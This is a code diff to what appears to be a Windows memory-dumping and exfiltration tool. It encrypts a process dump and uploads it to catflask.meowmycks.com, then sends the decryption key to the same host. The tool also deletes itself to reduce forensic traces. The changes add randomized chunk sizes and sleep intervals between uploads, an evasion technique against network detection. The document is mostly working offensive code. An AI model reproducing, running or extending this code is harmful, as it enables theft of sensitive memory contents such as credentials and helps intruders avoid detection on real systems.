@@ -7,14 +7,11 @@
 #include <winhttp.h>
 #include <dbghelp.h>
 #include <iostream>
-#include <sstream>
 #include <string>
 #include <random>
 #include <vector>
-#include <cctype>
-#include <limits>
-#include <ctime>
-#include <cstdlib>
+#include <chrono>
+#include <thread>
 #include <tlhelp32.h>
 #include <processsnapshot.h>
 
@@ -192,47 +189,6 @@ bool SendHTTPSRequest(const std::string& hostname, const std::string& path, cons
 		WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
 		WINHTTP_NO_HEADER_INDEX);
 
-	std::cout << "HTTP Status Code: " << statusCode << std::endl;
-
-	// Read and print the response data
-	DWORD size = 0;
-	DWORD downloaded = 0;
-	LPSTR outBuffer;
-	std::string response;
-	do {
-		// Check for available data
-		size = 0;
-		if (!WinHttpQueryDataAvailable(hRequest, &size)) {
-			std::cout << "Error in WinHttpQueryDataAvailable: " << GetLastError() << std::endl;
-			break;
-		}
-
-		// No more available data
-		if (size == 0)
-			break;
-
-		// Allocate space for the buffer
-		outBuffer = new char[size + 1];
-		if (!outBuffer) {
-			std::cout << "Out of memory" << std::endl;
-			size = 0;
-			break;
-		}
-		else {
-			// Read the data
-			ZeroMemory(outBuffer, size + 1);
-			if (!WinHttpReadData(hRequest, (LPVOID)outBuffer, size, &downloaded)) {
-				std::cout << "Error in WinHttpReadData: " << GetLastError() << std::endl;
-			}
-			else {
-				response.append(outBuffer, size);
-			}
-			delete[] outBuffer;
-		}
-	} while (size > 0);
-
-	std::cout << "Response Data: " << response << std::endl;
-
 	// Clean up
 	WinHttpCloseHandle(hRequest);
 	WinHttpCloseHandle(hConnect);
@@ -241,13 +197,31 @@ bool SendHTTPSRequest(const std::string& hostname, const std::string& path, cons
 	return result;
 }
 
-void SendDataInChunks(const std::vector<std::string>& chunks, const std::string& hostname, const std::string& path) {
-	for (size_t i = 0; i < chunks.size(); ++i) {
-		std::string dataToSend = chunks[i];
-		if (!SendHTTPSRequest(hostname, path, dataToSend)) {
-			// Handle error
-		}
-	}
+void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path) {
+	std::random_device rd;
+	std::mt19937 gen(rd());
+
+	std::uniform_int_distribution<> sizeDist(2 * 1024 * 1024, 5 * 1024 * 1024); // 2 MB to 5 MB
+	std::uniform_int_distribution<> timeDist(2000, 8000); // 2 seconds to 8 seconds
+
+	size_t offset = 0;
+	size_t totalSize = data.size();
+	size_t sequenceNumber = 0;
+
+	while (offset < totalSize) {
+		size_t chunkSize = std::min<size_t>(sizeDist(gen), totalSize - offset);
+        std::string chunk = data.substr(offset, chunkSize);
+
+        if (!SendHTTPSRequest(hostname, path, chunk)) {
+            // Handle error
+        }
+
+        offset += chunkSize;
+        sequenceNumber++;
+
+        int sleepTime = timeDist(gen);
+        std::this_thread::sleep_for(std::chrono::milliseconds(sleepTime));
+    }
 }
 
 // Delete itself to limit forensic artifacts
@@ -313,8 +287,7 @@ int main() {
 		std::string key = Keygen(numRNG());
 		std::string data = Base64Encode(EncryptDump(dumpBuffer, bytesRead, key));
 
-		std::vector<std::string> chunks = SplitDataIntoChunks(data, 5 * 1024 * 1024); // 5 MB
-		SendDataInChunks(chunks, "catflask.meowmycks.com", "/upload");
+		SendDataInChunks(data, "catflask.meowmycks.com", "/upload");
 		SendHTTPSRequest("catflask.meowmycks.com", "/upload", key, true);
 	}
 
